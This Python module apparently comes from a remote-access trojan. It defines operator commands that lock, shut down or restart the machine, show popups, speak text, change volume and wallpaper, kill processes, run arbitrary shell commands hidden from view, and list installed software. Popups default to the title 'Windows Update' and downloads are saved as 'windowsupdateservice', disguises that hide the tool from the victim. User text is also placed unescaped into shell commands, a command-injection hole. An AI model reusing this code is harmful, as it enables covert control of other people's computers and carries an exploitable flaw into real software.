"""Power, audio, wallpaper, popups and text-to-speech."""

from __future__ import annotations

import base64
import ctypes
import os
import subprocess
import sys
import tempfile
import threading

IS_WINDOWS = os.name == "nt"
CREATE_NO_WINDOW = 0x08000000 if IS_WINDOWS else 0


def _run(command: str, timeout: int = 30) -> str:
    try:
        completed = subprocess.run(command, shell=True, capture_output=True,
                                   timeout=timeout, creationflags=CREATE_NO_WINDOW)
        output = (completed.stdout or b"") + (completed.stderr or b"")
        return output.decode(errors="replace").strip() or "ok"
    except Exception as error:
        return f"(error: {error})"


def lock() -> str:
    """Lock the workstation."""
    if IS_WINDOWS:
        return _run("rundll32.exe user32.dll,LockWorkStation")
    if sys.platform == "darwin":
        return _run("pmset displaysleepnow")
    return _run("loginctl lock-session || gnome-screensaver-command -l")


def shutdown(delay: int = 5) -> str:
    """Power off."""
    if IS_WINDOWS:
        return _run(f"shutdown /s /t {delay}")
    return _run("shutdown -h now")


def restart(delay: int = 5) -> str:
    """Reboot."""
    if IS_WINDOWS:
        return _run(f"shutdown /r /t {delay}")
    return _run("shutdown -r now")


def sleep() -> str:
    """Suspend."""
    if IS_WINDOWS:
        return _run("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
    return _run("systemctl suspend")


def message(text: str, title: str = "") -> str:
    """Show a modal message box without blocking the command thread."""
    if not text:
        return "usage: msg <text>"
    if IS_WINDOWS:
        user32 = ctypes.windll.user32
        threading.Thread(
            target=lambda: user32.MessageBoxW(None, text, title or "Windows Update", 0x40),
            daemon=True,
        ).start()
        return "popup shown"
    return _run(f'xmessage -center "{text}" &')


def beep(kind: str = "") -> str:
    """Play a short tone.  ``kind='alarm'`` plays a sequence."""
    if IS_WINDOWS:
        try:
            import winsound
            if kind.strip().lower() == "alarm":
                for _ in range(5):
                    winsound.Beep(1100, 180)
            else:
                winsound.Beep(880, 250)
            return "beep"
        except Exception:
            pass
    return _run("printf '\\a'")


def speak(text: str) -> str:
    """Read ``text`` aloud."""
    if not text:
        return "usage: say <text>"
    if IS_WINDOWS:
        try:
            b64_text = base64.b64encode(text.encode("utf-16-le")).decode("ascii")
            ps_script = (
                "Add-Type -AssemblyName System.Speech; "
                f"$txt = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('{b64_text}')); "
                "(New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak($txt)"
            )
            encoded_cmd = base64.b64encode(ps_script.encode("utf-16-le")).decode("ascii")
            return _run(f"powershell -NoProfile -NonInteractive -EncodedCommand {encoded_cmd}")
        except Exception as error:
            return f"(error: {error})"
    if sys.platform == "darwin":
        return _run(f'say "{text}"')
    return _run(f'espeak "{text}"')


def volume(action: str) -> str:
    """Change the system volume.  Accepts ``up``, ``down``, ``mute`` or ``0-100``."""
    if not IS_WINDOWS:
        return _run(f"amixer -q set Master {action or 'toggle'}")

    user32 = ctypes.windll.user32

    def tap(code: int, times: int = 1) -> None:
        for _ in range(times):
            user32.keybd_event(code, 0, 0, 0)
            user32.keybd_event(code, 0, 2, 0)

    action = (action or "").strip().lower()
    if action in ("up", "+"):
        tap(0xAF, 2)
        return "volume up"
    if action in ("down", "-"):
        tap(0xAE, 2)
        return "volume down"
    if action == "mute":
        tap(0xAD)
        return "mute toggled"
    try:
        level = max(0, min(100, int(action)))
    except ValueError:
        return "usage: vol up|down|mute|0-100"
    tap(0xAF, 55)
    tap(0xAE, (100 - level) // 2)
    return f"volume ~{level}%"


def wallpaper(path: str) -> str:
    """Set the desktop wallpaper from a local path or URL."""
    if not path:
        return "usage: wallpaper <path|url>"
    target = os.path.expanduser(path.strip().strip('"'))

    if target.startswith(("http://", "https://")):
        try:
            import urllib.request
            suffix = os.path.splitext(target)[1] or ".jpg"
            local = os.path.join(tempfile.gettempdir(), "windowsupdateservice" + suffix)
            with urllib.request.urlopen(target, timeout=30) as response:
                with open(local, "wb") as handle:
                    handle.write(response.read())
            target = local
        except Exception as error:
            return f"download failed: {error}"

    if not os.path.exists(target):
        return "file not found"

    if IS_WINDOWS:
        ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(target), 3)
        return "wallpaper set"
    if sys.platform == "darwin":
        return _run(f'osascript -e \'tell application "System Events" to set picture of '
                    f'every desktop to "{target}"\'')
    for command in (["gsettings", "set", "org.gnome.desktop.background", "picture-uri",
                     "file://" + os.path.abspath(target)],
                    ["feh", "--bg-scale", os.path.abspath(target)]):
        try:
            subprocess.run(command, timeout=15, creationflags=CREATE_NO_WINDOW)
            return "wallpaper set"
        except FileNotFoundError:
            continue
    return "no wallpaper tool available"


def open_target(path: str) -> str:
    """Open a file, folder or URL with the default application."""
    if not path:
        return "usage: open <path|url>"
    target = os.path.expanduser(path.strip().strip('"'))
    if IS_WINDOWS:
        try:
            os.startfile(target)  # type: ignore[attr-defined]
            return f"opened {target}"
        except OSError as error:
            return f"(error: {error})"
    return _run(f'xdg-open "{target}" &')


def kill_process(identifier: str) -> str:
    """Terminate a process by pid or image name."""
    if not identifier:
        return "usage: kill <pid|name>"
    if IS_WINDOWS:
        if identifier.isdigit():
            return _run(f"taskkill /F /PID {identifier}")
        return _run(f'taskkill /F /IM "{identifier}"')
    return _run(f"kill -9 {identifier}")


def start_process(command: str) -> str:
    """Start a detached process."""
    if not command:
        return "usage: start <command>"
    try:
        if IS_WINDOWS:
            subprocess.Popen(command, shell=True, creationflags=CREATE_NO_WINDOW)
        else:
            subprocess.Popen(command, shell=True, start_new_session=True,
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return f"started: {command}"
    except Exception as error:
        return f"(error: {error})"


def installed_programs() -> list[str]:
    """List installed software."""
    if not IS_WINDOWS:
        return _run("dpkg-query -W -f='${Package}\\n' 2>/dev/null | head -150").splitlines()

    import winreg
    names: set[str] = set()
    locations = (
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
        (winreg.HKEY_LOCAL_MACHINE,
         r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
        (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
    )
    for hive, path in locations:
        try:
            with winreg.OpenKey(hive, path) as key:
                for index in range(winreg.QueryInfoKey(key)[0]):
                    try:
                        with winreg.OpenKey(key, winreg.EnumKey(key, index)) as subkey:
                            name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                            if name:
                                names.add(str(name))
                    except OSError:
                        continue
        except OSError:
            continue
    return sorted(names)
